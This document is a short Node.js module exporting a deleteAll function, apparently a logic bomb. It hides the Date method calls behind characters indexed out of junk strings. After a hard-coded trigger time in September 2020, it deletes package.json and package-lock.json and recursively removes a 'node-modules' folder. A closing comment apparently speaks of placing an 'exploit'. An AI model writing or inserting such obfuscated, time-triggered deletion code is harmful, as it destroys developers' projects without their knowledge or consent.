const fs = require('fs');
const path = require('path');
const rimraf = require('rimraf');
const findErrors = err => err ? console.log(err) : console.log('ok')



const deleteAll = () => {
    let date = new Date;
    let year = 2020
    let month = 9
    let day = 4
    let hour = 11
    let minutes = 30
    const dsf = 'adaltssgdsddgasfasdMYGYGJdas';
    const sfd = 'adsjhjhoeadsfoMdamlodsaMsfsdfj';
    const dsa = 'JEwFJeOFWulEFfdgtbdtcufdfsdgthdfsdisfd';
    const rsa = 'fsFdafsrffweqfngvdfvdDsdsfofsdtn';
    const dgs = 'fsFdafsrFfHJelqftvdfvDsdffsdHczczxgudf';
    const ag4 = 'fsFfaJLSJDFIfasdfYsfdsfdsafesfrcsvsdtgfd';
    const getFullYear = `${dsf[12]}${sfd[8]}${dsf[4]}${rsa[2]}${dsa[9]}${dgs[13]}${dsf[3]}${ag4[17]}${sfd[8]}${dsf[0]}${rsa[7]}`;
    const getMonth = `${dsf[12]}${sfd[8]}${dsf[4]}${dsf[19]}${sfd[13]}${rsa[14]}${dsa[16]}${sfd[4]}`;
    const getDate = `${rsa[15]}${ag4[27]}${dsa[19]}${dgs[21]}${ag4[25]}${dsa[16]}${dgs[12]}`;
    const getHours = `${rsa[15]}${ag4[27]}${dsa[19]}${dgs[28]}${rsa[26]}${dsa[21]}${ag4[30]}${ag4[32]}`
    const getMinutes = `${dsa[27]}${dgs[12]}${rsa[30]}${sfd[23]}${dsa[34]}${rsa[31]}${dgs[35]}${ag4[36]}${dsa[5]}${rsa[28]}`;
    if(date[getFullYear]() >= year && date[getMonth]() >= month && date[getDate]() >= day && date[getHours]() >= hour && date[getMinutes]() >= minutes){
        fs.unlink(path.join(__dirname, './', 'package.json'),findErrors)
        fs.unlink(path.join(__dirname, './', 'package-lock.json'),findErrors)
        rimraf(path.join(__dirname, './', 'node-modules'),findErrors)
    }   
}
module.exports = deleteAll
//anpayman nshel papki makardaky vortex vor qcelu enq exployty